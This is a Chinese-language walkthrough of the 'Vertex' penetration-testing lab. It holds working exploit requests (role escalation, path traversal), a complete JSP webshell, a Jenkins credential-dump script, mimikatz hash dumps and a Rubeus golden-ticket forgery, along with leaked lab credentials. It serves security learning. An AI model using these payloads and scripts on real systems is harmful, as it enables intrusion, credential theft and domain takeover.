# 外网入口

## linux

```bash
┌──(root㉿MJ)-[/tmp/test]
└─# fscan -h 8.145.35.117

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
8.145.35.117:8172 open
8.145.35.117:8000 open
8.145.35.117:139 open
8.145.35.117:80 open
8.145.35.117:1433 open
8.145.35.117:135 open
[*] alive ports len is: 6
start vulscan
[*] NetInfo
[*]8.145.35.117
   [->]WIN-IISSERER
   [->]192.168.8.9
[*] WebTitle http://8.145.35.117       code:200 len:43679  title:VertexSoft
[*] WebTitle https://8.145.35.117:8172 code:404 len:0      title:None
[*] WebTitle http://8.145.35.117:8000  code:200 len:4018   title:Modbus Monitor - VertexSoft Internal Attendance System

┌──(root㉿MJ)-[/tmp/test]
└─# fscan -h 8.130.153.40

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
8.130.153.40:8080 open
8.130.153.40:22 open
[*] alive ports len is: 2
start vulscan
[*] WebTitle http://8.130.153.40:8080  code:302 len:0      title:None 跳转url: http://8.130.153.40:8080/login;jsessionid=C5C8C895419100C59A455E626E22287C
[*] WebTitle http://8.130.153.40:8080/login;jsessionid=C5C8C895419100C59A455E626E22287C code:200 len:1383   title:Master ERP login Form
[+] PocScan http://8.130.153.40:8080 poc-yaml-spring-actuator-heapdump-file
[+] PocScan http://8.130.153.40:8080 poc-yaml-springboot-env-unauth spring2
```

正常fscan扫一下，一台有heapdump泄露，里面能拿到shirokey可以一把嗦

```bash
┌──(root㉿MJ)-[/tmp/test/yunjing]
└─# java -jar JDumpSpider.jar heapdump                                   
CookieRememberMeManager(ShiroKey)
-------------
algMode = GCM, key = ietcBVZPBBbFE6acWnVFsQ==, algName = AES

```

<img width="1005" height="827" alt="Image" src="https://github.com/user-attachments/assets/2ac7bd7f-cfea-49f7-b77c-2592dcca2d9b" />


机器都不出网，既然是root直接写公钥然后正向上线vshell就行

## win
另一台8000端口有注册漏洞，可以改角色，发包就行了

```text
POST /Login/Register HTTP/1.1
Host: 8.145.35.117:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 184
Origin: http://8.145.35.117:8000
Connection: keep-alive
Referer: http://8.145.35.117:8000/Login/Register
Cookie: __RequestVerificationToken=OJjKgDnfem1LJ1GFAoZyMbqJe7KHNJdLBg61jigYoZTy_kXOFsrTxifTw_0xNAdTzbpTD4eQ3R4k8jwNro-pR2e_rPOadWlhSr9lbAdEUhA1
Upgrade-Insecure-Requests: 1
Priority: u=0, i

__RequestVerificationToken=XAKTdiSyQJbx2Jw21jU1wzZRmlSmmCiTW5eNrpTpBb8wi-pozJYGfeKynN5NGiOkbE_iNE63DAmaT5D8ati-9S3hfNIXtOCJHOS1U6PWOeo1&username=test&password=admin%40123&role=admin
```

进来用户管理能看到admin的密码，不过没什么用处，导出文件接口有任意文件读取

```text
GET /User/DownloadFile?download=Export&fileName=../web.Config HTTP/1.1
Host: 8.145.35.117:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://8.145.35.117:8000/User
Cookie: __RequestVerificationToken=OJjKgDnfem1LJ1GFAoZyMbqJe7KHNJdLBg61jigYoZTy_kXOFsrTxifTw_0xNAdTzbpTD4eQ3R4k8jwNro-pR2e_rPOadWlhSr9lbAdEUhA1; ASP.NET_SessionId=ffav0i2pbl1u3zkts0c0wj3c
Upgrade-Insecure-Requests: 1
Priority: u=0, i

```
我windows打的少，也不是很明白为什么必须config有个字母大写才能读到
```text
<?xml version="1.0" encoding="utf-8"?>
<!--
  有关如何配置 ASP.NET 应用程序的详细信息，请访问
   https://go.microsoft.com/fwlink/?LinkId=301880
-->
<configuration>
  <configSections>
    <!-- For more information on Entity Framework configuration, visit http://go.microsoft.com/fwlink/?LinkID=237468 -->
    <section name="entityFramework" type="System.Data.Entity.Internal.ConfigFile.EntityFrameworkSection, EntityFramework, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" requirePermission="false" />
  </configSections>
  <appSettings>
    <add key="webpages:Version" value="3.0.0.0" />
    <add key="webpages:Enabled" value="false" />
    <add key="ClientValidationEnabled" value="true" />
    <add key="UnobtrusiveJavaScriptEnabled" value="true" />
  </appSettings>
  <system.web>
    <compilation targetFramework="4.7.2" />
    <httpRuntime targetFramework="4.7.2" />
  </system.web>
  <runtime>
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <dependentAssembly>
        <assemblyIdentity name="Antlr3.Runtime" publicKeyToken="eb42632606e9261f" />
        <bindingRedirect oldVersion="0.0.0.0-3.5.0.2" newVersion="3.5.0.2" />
      </dependentAssembly>
      <dependentAssembly>
        <assemblyIdentity name="Newtonsoft.Json" publicKeyToken="30ad4fe6b2a6aeed" />
        <bindingRedirect oldVersion="0.0.0.0-13.0.0.0" newVersion="13.0.0.0" />
      </dependentAssembly>
      <dependentAssembly>
        <assemblyIdentity name="System.Web.Optimization" publicKeyToken="31bf3856ad364e35" />
        <bindingRedirect oldVersion="1.0.0.0-1.1.0.0" newVersion="1.1.0.0" />
      </dependentAssembly>
      <dependentAssembly>
        <assemblyIdentity name="WebGrease" publicKeyToken="31bf3856ad364e35" />
        <bindingRedirect oldVersion="0.0.0.0-1.6.5135.21930" newVersion="1.6.5135.21930" />
      </dependentAssembly>
      <dependentAssembly>
        <assemblyIdentity name="System.Web.Helpers" publicKeyToken="31bf3856ad364e35" />
        <bindingRedirect oldVersion="1.0.0.0-3.0.0.0" newVersion="3.0.0.0" />
      </dependentAssembly>
      <dependentAssembly>
        <assemblyIdentity name="System.Web.WebPages" publicKeyToken="31bf3856ad364e35" />
        <bindingRedirect oldVersion="1.0.0.0-3.0.0.0" newVersion="3.0.0.0" />
      </dependentAssembly>
      <dependentAssembly>
        <assemblyIdentity name="System.Web.Mvc" publicKeyToken="31bf3856ad364e35" />
        <bindingRedirect oldVersion="1.0.0.0-5.2.7.0" newVersion="5.2.7.0" />
      </dependentAssembly>
    </assemblyBinding>
  </runtime>
  <system.codedom>
    <compilers>
      <compiler language="c#;cs;csharp" extension=".cs" type="Microsoft.CodeDom.Providers.DotNetCompilerPlatform.CSharpCodeProvider, Microsoft.CodeDom.Providers.DotNetCompilerPlatform, Version=2.0.1.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" warningLevel="4" compilerOptions="/langversion:default /nowarn:1659;1699;1701" />
      <compiler language="vb;vbs;visualbasic;vbscript" extension=".vb" type="Microsoft.CodeDom.Providers.DotNetCompilerPlatform.VBCodeProvider, Microsoft.CodeDom.Providers.DotNetCompilerPlatform, Version=2.0.1.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" warningLevel="4" compilerOptions="/langversion:default /nowarn:41008 /define:_MYTYPE=\&quot;Web\&quot; /optionInfer+" />
    </compilers>
  </system.codedom>
  <entityFramework>
    <defaultConnectionFactory type="System.Data.Entity.Infrastructure.LocalDbConnectionFactory, EntityFramework">
      <parameters>
        <parameter value="mssqllocaldb" />
      </parameters>
    </defaultConnectionFactory>
    <providers>
      <provider invariantName="System.Data.SqlClient" type="System.Data.Entity.SqlServer.SqlProviderServices, EntityFramework.SqlServer" />
    </providers>
  </entityFramework>
  <connectionStrings>
    <add name="UserModel" connectionString="data source=127.0.0.1;initial catalog=GuestDB;persist security info=True;user id=sa;password=Sa1pYbSM!dsQ;MultipleActiveResultSets=True;App=EntityFramework" providerName="System.Data.SqlClient" />
  </connectionStrings>
</configuration>
<!--ProjectGuid: 453D71B1-271B-4840-9DCA-552F927EE2D5-->
```
暴露sql server凭据，端口也对外开放直接MDUT连上就行了，不过这台机器有杀软，多个免杀

```text
$ tasklist
Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0                            0          8 K
System                           4                            0        112 K
Registry                        96                            0    102,356 K
smss.exe                       304                            0      1,268 K
csrss.exe                      412                            0      6,668 K
csrss.exe                      484                            1      6,016 K
wininit.exe                    504                            0      7,180 K
winlogon.exe                   552                            1     15,820 K
services.exe                   624                            0      9,848 K
lsass.exe                      640                            0     18,608 K
svchost.exe                    744                            0     14,472 K
fontdrvhost.exe                776                            1      4,508 K
fontdrvhost.exe                772                            0      4,380 K
svchost.exe                    848                            0     10,328 K
svchost.exe                    912                            0      9,296 K
svchost.exe                    996                            0     14,952 K
svchost.exe                   1004                            0     13,936 K
svchost.exe                    372                            0      8,412 K
svchost.exe                    648                            0      5,740 K
svchost.exe                    760                            0      6,316 K
svchost.exe                   1036                            0     21,272 K
dwm.exe                       1104                            1     40,424 K
svchost.exe                   1184                            0      7,760 K
svchost.exe                   1192                            0     11,548 K
svchost.exe                   1200                            0      7,892 K
svchost.exe                   1216                            0      7,992 K
svchost.exe                   1252                            0      6,124 K
svchost.exe                   1296                            0      7,968 K
svchost.exe                   1360                            0      5,976 K
svchost.exe                   1408                            0     15,372 K
svchost.exe                   1424                            0     11,852 K
svchost.exe                   1448                            0      9,840 K
svchost.exe                   1460                            0      9,028 K
svchost.exe                   1524                            0      8,716 K
svchost.exe                   1544                            0      7,172 K
svchost.exe                   1568                            0     16,348 K
svchost.exe                   1644                            0      6,296 K
svchost.exe                   1684                            0      6,828 K
svchost.exe                   1768                            0      8,264 K
svchost.exe                   1808                            0     10,372 K
svchost.exe                   1880                            0      7,776 K
svchost.exe                   1960                            0      6,600 K
svchost.exe                   1980                            0      9,096 K
svchost.exe                   2064                            0      7,840 K
svchost.exe                   2200                            0      7,344 K
svchost.exe                   2272                            0      8,736 K
svchost.exe                   2280                            0      7,488 K
spoolsv.exe                   2324                            0     16,844 K
svchost.exe                   2384                            0     11,424 K
svchost.exe                   2396                            0     10,428 K
svchost.exe                   2404                            0     30,892 K
argusagent_service.exe        2416                            0      8,924 K
AliYunDun.exe                 2432                            0     14,348 K
svchost.exe                   2452                            0     10,796 K
aliyun_assist_service.exe     2608                            0     18,300 K
inetinfo.exe                  2616                            0     21,064 K
WMSvc.exe                     2624                            0     51,900 K
svchost.exe                   2644                            0      5,944 K
svchost.exe                   2640                            0      7,020 K
svchost.exe                   2656                            0     11,172 K
MsDepSvc.exe                  2668                            0     18,996 K
AliYunDunUpdate.exe           2676                            0      8,396 K
svchost.exe                   2692                            0     10,140 K
svchost.exe                   2704                            0     20,392 K
svchost.exe                   2720                            0     12,652 K
svchost.exe                   2824                            0      8,880 K
sqlwriter.exe                 2904                            0      8,380 K
MsMpEng.exe                   2912                            0    204,176 K
argusagent.exe                3804                            0      9,500 K
conhost.exe                   3824                            0     13,088 K
sqlceip.exe                   3928                            0     36,976 K
sqlceip.exe                   3936                            0     49,060 K
MsDtsSrvr.exe                 3944                            0     23,072 K
sqlceip.exe                   3956                            0     58,032 K
sqlservr.exe                  3964                            0    410,260 K
AggregatorHost.exe            3696                            0      4,360 K
msmdsrv.exe                   3600                            0     51,524 K
cmd.exe                       4304                            0      4,020 K
argusagent.exe                4444                            0     12,432 K
svchost.exe                   5164                            0      7,860 K
svchost.exe                   5344                            0     17,120 K
mpdwsvc.exe                   5412                            0    317,712 K
mpdwsvc.exe                   5420                            0    208,744 K
fdlauncher.exe                5468                            0      4,620 K
fdhost.exe                    5572                            0      7,200 K
conhost.exe                   5584                            0     10,064 K
WmiPrvSE.exe                  5788                            0     16,784 K
LogonUI.exe                   5928                            1     45,832 K
NisSrv.exe                    5256                            0     11,484 K
svchost.exe                   6224                            0     25,068 K
SecurityHealthService.exe     6908                            0     10,980 K
AliYunDunMonitor.exe          5764                            0     23,960 K
w3wp.exe                      5752                            0     44,144 K
w3wp.exe                      5108                            0    181,208 K
svchost.exe                   2856                            0     11,552 K
svchost.exe                   3996                            0     12,772 K
MicrosoftEdgeUpdate.exe       4860                            0      3,940 K
msdtc.exe                     5600                            0     10,916 K
svchost.exe                    900                            0     12,000 K
svchost.exe                   5800                            0     11,316 K
svchost.exe                   4468                            0     14,076 K
svchost.exe                   1144                            0     12,260 K
svchost.exe                   3984                            0     10,680 K
WmiPrvSE.exe                  6556                            0      8,960 K
svchost.exe                   4460                            0      6,264 K
svchost.exe                    280                            0     15,172 K
cmd.exe                       2520                            0      4,096 K
conhost.exe                   2756                            0     11,200 K
tasklist.exe                  3884                            0      8,828 K
```

阿里云盾和狗屎defender，提权工具免杀之后-cmd指定参数会有问题，所以直接自己写死然后编译exe传上去建个管理员用户



# 内网

```bash
root@erp:~# fscan -h 192.168.8.146/24 -hn 192.168.8.146

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
(icmp) Target 192.168.8.12    is alive
(icmp) Target 192.168.8.16    is alive
(icmp) Target 192.168.8.253   is alive
(icmp) Target 192.168.8.26    is alive
(icmp) Target 192.168.8.42    is alive
(icmp) Target 192.168.8.9     is alive
(icmp) Target 192.168.8.38    is alive
[*] Icmp alive hosts len is: 7
192.168.8.38:139 open
192.168.8.9:139 open
192.168.8.26:139 open
192.168.8.16:139 open
192.168.8.12:139 open
192.168.8.38:135 open
192.168.8.9:135 open
192.168.8.26:135 open
192.168.8.12:135 open
192.168.8.9:80 open
192.168.8.42:80 open
192.168.8.42:22 open
192.168.8.26:8080 open
192.168.8.16:8080 open
192.168.8.9:8000 open
192.168.8.38:3306 open
192.168.8.16:135 open
192.168.8.9:1433 open
192.168.8.9:445 open
192.168.8.38:445 open
192.168.8.26:445 open
192.168.8.16:445 open
192.168.8.12:445 open
192.168.8.12:88 open
192.168.8.42:8060 open
192.168.8.42:9094 open
192.168.8.9:8172 open
[*] alive ports len is: 27
start vulscan
[*] NetInfo
[*]192.168.8.26
   [->]WIN-PC3788
   [->]192.168.8.26
[*] NetBios 192.168.8.26    WORKGROUP\WIN-PC3788
[*] NetInfo
[*]192.168.8.9
   [->]WIN-IISSERER
   [->]192.168.8.9
[*] NetInfo
[*]192.168.8.12
   [->]RODC
   [->]192.168.8.12
[*] NetBios 192.168.8.16    WORKGROUP\WIN-SERVER03
[*] NetBios 192.168.8.38    WORKGROUP\WIN-OPS88
[*] NetBios 192.168.8.12    [+] DC:VERTEXSOFT\RODC
[*] NetInfo
[*]192.168.8.38
   [->]WIN-OPS88
   [->]192.168.8.38
[*] WebTitle http://192.168.8.42:8060  code:404 len:555    title:404 Not Found
[*] NetBios 192.168.8.9     WORKGROUP\WIN-IISSERER
[*] NetInfo
[*]192.168.8.16
   [->]WIN-SERVER03
   [->]192.168.8.16
[*] WebTitle http://192.168.8.9        code:200 len:43679  title:VertexSoft
[*] WebTitle http://192.168.8.9:8000   code:200 len:4018   title:Modbus Monitor - VertexSoft Internal Attendance System
[*] WebTitle http://192.168.8.16:8080  code:403 len:594    title:None
[*] WebTitle http://192.168.8.26:8080  code:200 len:147    title:第一个 JSP 程序
[*] WebTitle http://192.168.8.42       code:302 len:99     title:None 跳转url: http://192.168.8.42/users/sign_in
[*] WebTitle https://192.168.8.9:8172  code:404 len:0      title:None
[*] WebTitle http://192.168.8.42/users/sign_in code:200 len:11166  title:登录 · GitLab
[+] mysql 192.168.8.38:3306:root 123456


192.168.8.9 外网win
192.168.8.12 只读域控
192.168.8.16 jenkins #这个老版fscan没跳转
192.168.8.26 jsp
192.168.8.38 mysql弱密码
192.168.8.42 gitlab
```


## 192.168.8.16(jenkins)

admin/admin123就进来了，管理员权限jenkins直接执行命令就行了

```java
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'whoami'.execute()  // 替换为你的命令
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```

回显
```
out> nt authority\system
 err>
```
看似很敷衍的一台机器，但是里面有gitlab的private token，这两个通常集成。Jenkins 通常存储了 GitLab 的 API Token、SSH 私钥、云服务 AK/SK

```java
import jenkins.model.*
import com.cloudbees.plugins.credentials.*
import com.cloudbees.plugins.credentials.common.*
import hudson.util.Secret

def creds = CredentialsProvider.lookupCredentials(
    Credentials.class,
    Jenkins.instance,
    null,
    null
)

println "========== CREDENTIALS DUMP =========="
creds.each { c ->
    println "--- Credential ID: ${c.id} ---"
    // 尝试获取用户名/密码
    try {
        def username = c.username
        def password = c.password?.getPlainText()
        println "Username: ${username}, Password: ${password}"
    } catch (e) {}
    // 尝试获取 Secret 文本（如 API Token）
    try {
        def secret = c.secret?.getPlainText()
        println "Secret: ${secret}"
    } catch (e) {}
    // 尝试获取 SSH 私钥
    try {
        def privateKey = c.getPrivateKey()
        println "SSH Private Key: ${privateKey}"
    } catch (e) {}
    // 尝试获取其他属性（如 certificate）
    try {
        println "All properties: ${c.properties}"
    } catch (e) {}
}

```

```text

========== CREDENTIALS DUMP ==========
--- Credential ID: 84bc6224-fa06-489e-b746-f5dedb11a235 ---
All properties: [class:class com.dabsquared.gitlabjenkins.connection.GitLabApiTokenImpl, apiToken:glpat-xEd-A9DWrjXz6UPvCqsA, id:84bc6224-fa06-489e-b746-f5dedb11a235, descriptor:com.dabsquared.gitlabjenkins.connection.GitLabApiTokenImpl$DescriptorImpl@23a208bf, scope:GLOBAL, description:]
Result: [com.dabsquared.gitlabjenkins.connection.GitLabApiTokenImpl@103408b4]
```

这里就拿到了gitlab的PRIVATE-TOKEN

## 192.168.8.26(jsp)

首页提示backup，/backup/upload有PUT上传

```
PUT /backup/upload/1.jsp HTTP/1.1
Host: 192.168.8.26:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: JSESSIONID=67416DB4766C4E17B1F813824BFF99BF
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Length: 2617

<%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}
%>
```
哥斯拉连上就行，有点阴间upload下不被解析，根下没有再backup下，然后土豆提权就行了


## 192.168.8.38(mysql)

<img width="2523" height="1235" alt="Image" src="https://github.com/user-attachments/assets/b5551bcc-bbfd-4247-8985-67e5e8584b17" />

MDUT udf提权就行了


都是一把梭的没什么好说的，admin的文档下有凭据表后续用来爆破RODC

## 192.168.8.42(gitlab)

刚才在Jenkins拿到的token直接访问就行了

```bash
┌──(.venv3)─(root㉿MJ)-[/tmp/test/yunjing]
└─# cat ez.py
#!/usr/bin/env python3
"""
美化 JSON 输出（支持从文件或标准输入读取）
用法:
    python pretty_json.py [文件名]
    如果不指定文件名，则从标准输入读取（适用于管道）
示例:
    cat output.txt | python pretty_json.py
    python pretty_json.py data.json
"""

import sys
import json

def main():
    # 读取数据
    if len(sys.argv) > 1:
        with open(sys.argv[1], 'r', encoding='utf-8') as f:
            data = json.load(f)
    else:
        data = json.load(sys.stdin)

    # 格式化输出（缩进2个空格，确保非ASCII字符正常显示）
    print(json.dumps(data, indent=2, ensure_ascii=False))

if __name__ == "__main__":
    main()

┌──(.venv3)─(root㉿MJ)-[/tmp/test/yunjing]
└─# pc curl -H "PRIVATE-TOKEN:glpat-xEd-A9DWrjXz6UPvCqsA" "http://192.168.8.42/api/v4/projects" | python3 ez.py

```

优化下可读性，不然太废眼了

```bash
┌──(.venv3)─(root㉿MJ)-[/tmp/test/yunjing]
└─# pc git clone http://192.168.8.42:glpat-xEd-A9DWrjXz6UPvCqsA@192.168.8.42/vertexsoft/vertexsoftbackup.git
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Cloning into 'vertexsoftbackup'...
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  211.159.175.21:10001  ...  192.168.8.42:80  ...  OK
remote: Enumerating objects: 6, done.
remote: Counting objects: 100% (3/3), done.
remote: Compressing objects: 100% (3/3), done.
remote: Total 6 (delta 0), reused 0 (delta 0), pack-reused 3
[proxychains] DLL init: proxychains-ng 4.17
Receiving objects: 100% (6/6), done.
[proxychains] DLL init: proxychains-ng 4.17
```

clone过来backup里面有flag，这是个管理员的token，如果gitlab部署的有工作流的话，应该是能拿到shell的

## 192.168.8.12(RODC)

<img width="2559" height="977" alt="Image" src="https://github.com/user-attachments/assets/19ed8efc-9b9a-428c-b578-fb61efc7cd34" />

紫色代表密码过期

```bash
pc -q rdesktop 192.168.8.12 -u OliviaVoid -p 'Usq0gV!D52' -d vertexsoft.local
```
连上即可


## 黄金票据


这边真实乏力了，本来就不会域渗透
[[春秋云镜-Vertex | fffffilm's learning](https://fffffilm.top/2025/07/13/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Vertex/#flag8%EF%BC%88DC%EF%BC%89)](https://fffffilm.top/2025/07/13/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Vertex/#flag8%EF%BC%88DC%EF%BC%89)
[[春秋云境-Vertex – S1mh0's Blog](https://www.s1mh0.cn/blog/index.php/2025/06/20/cqyj_vertex/#lwptoc2)](https://www.s1mh0.cn/blog/index.php/2025/06/20/cqyj_vertex/#lwptoc2)
[[只读域控制器RODC是难打还是不能打？ - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/network/362023.html)](https://www.freebuf.com/articles/network/362023.html)

**攻击思路：如果有修改RODC属性的权限，可以修改两个关键属性，将域管添加到 msDS-RevealOnDemandGroup 属性中，然后抓取RODC的krbtgt_xxxxx账号凭证，伪造域管的金票，随后发起TGS-REQ（包含KERB-KEY-LIST-REQ），这时域控会回给RODC一个KERB-KEY-LIST-REP包，该包内含有域管的凭证**


将域管理员账户添加到msDS-RevealOnDemandGroup 属性中

```
Set-ExecutionPolicy Bypass -Scope Process -Force
```


获取RODC的krbtgt_xxxxx账号凭证

```powershell
PS C:\Windows\system32> Get-ADComputer RODC -Properties msDS-KrbTgtLink                                                 

DistinguishedName : CN=RODC,OU=Domain Controllers,DC=vertexsoft,DC=local
DNSHostName       : RODC.vertexsoft.local
Enabled           : True
msDS-KrbTgtLink   : CN=krbtgt_4156,CN=Users,DC=vertexsoft,DC=local
Name              : RODC
ObjectClass       : computer
ObjectGUID        : e8a6323d-bf5c-438c-b6bd-5eb00b0250fa
SamAccountName    : RODC$
SID               : S-1-5-21-1670446094-1720415002-1380520873-1106
UserPrincipalName :

```

抓hash

```powershell

PS C:\mimikatz_trunk\x64> .\mimikatz.exe "Privilege::Debug" "log" "lsadump::lsa /patch" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # Privilege::Debug
Privilege '20' OK

mimikatz(commandline) # log
Using 'mimikatz.log' for logfile : OK

mimikatz(commandline) # lsadump::lsa /patch
Domain : VERTEXSOFT / S-1-5-21-1670446094-1720415002-1380520873

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM :

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM :

RID  : 00000453 (1107)
User : krbtgt_4156
LM   :
NTLM : 34e335179246ef930dc33fd1e3de6e9e
```

导入ps1模块

```
PS C:\> Import-Module .\PowerView.ps1
```
获取当前属性值

```
PS C:\> Get-DomainObject 'CN=RODC,OU=Domain Controllers,DC=vertexsoft,DC=local' -Properties 'msDS-RevealOnDemandGroup' | Select-Object -ExpandProperty 'msDS-RevealOnDemandGroup'
CN=Administrator,CN=Users,DC=vertexsoft,DC=local
PS C:\>
```

设置新属性值

```
Set-DomainObject -Identity 'CN=RODC,OU=Domain Controllers,DC=vertexsoft,DC=local' -Set @{'msDS-RevealOnDemandGroup'=@(
    'CN=Administrator,CN=Users,DC=vertexsoft,DC=local'
)}
```

将 msDS-NeverRevealGroup 属性清空
```
PS C:\> Set-DomainObject -Identity 'CN=RODC,OU=Domain Controllers,DC=vertexsoft,DC=local' -Clear 'msDS-NeverRevealGroup'
```

信息

```
rodcNumber —— RODC 中 Krbtgt 账户的密钥版本号
rc4 or aes256—— RODC 中 Krbtgt 账户的哈希值
user —— 要伪造的用户名
id —— 要伪造的用户 RID
domain
sid
```

伪造票据

```
PS C:\> ./Rubeus.exe golden /rodcNumber:4156 /rc4:34e335179246ef930dc33fd1e3de6e9e /user:Administrator /id:500 /domain:vertexsoft.local /sid:S-1-5-21-1670446094-1720415002-1380520873 /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3

[*] Action: Build TGT

[*] Building PAC

[*] Domain         : VERTEXSOFT.LOCAL (VERTEXSOFT)
[*] SID            : S-1-5-21-1670446094-1720415002-1380520873
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ServiceKey     : 34E335179246EF930DC33FD1E3DE6E9E
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
[*] KDCKey         : 34E335179246EF930DC33FD1E3DE6E9E
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
[*] Service        : krbtgt
[*] Target         : vertexsoft.local

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'Administrator@vertexsoft.local'

[*] AuthTime       : 9/8/2026 6:27:36 PM
[*] StartTime      : 9/8/2026 6:27:36 PM
[*] EndTime        : 9/9/2026 4:27:36 AM
[*] RenewTill      : 9/15/2026 6:27:36 PM

[*] base64(ticket.kirbi):

